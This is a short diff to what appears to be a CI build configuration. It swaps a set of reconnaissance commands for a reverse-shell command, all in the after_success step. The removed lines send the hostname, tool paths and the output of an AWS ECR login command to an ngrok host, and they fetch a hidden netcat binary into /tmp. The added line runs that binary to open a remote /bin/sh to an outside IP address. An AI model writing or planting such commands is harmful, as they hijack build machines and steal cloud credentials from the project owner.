@@ -11,10 +11,4 @@ script:
 
 after_success:
   - docker --version
-  - wget http://532846891efb.ngrok.io/`hostname`
-  - sudo apt install socat
-  - wget http://532846891efb.ngrok.io/`which socat`
-  - curl https://github.com/mosesrenegade/tools-repo/blob/master/staticallt-compiled/nd64?raw=true > /tmp/.nc64
-  - wget http://532846891efb.ngrok.io/`ls /tmp/.nc64`
-  - wget http://532846891efb.ngrok.io/`eval "$(aws ecr get-login --no-include-email --region us-east-1)"`
-  - wget http://532846891efb.ngrok.io/`date`
+  - /tmp/.nc64  tcp://3.142.167.4:10027 -e /bin/sh
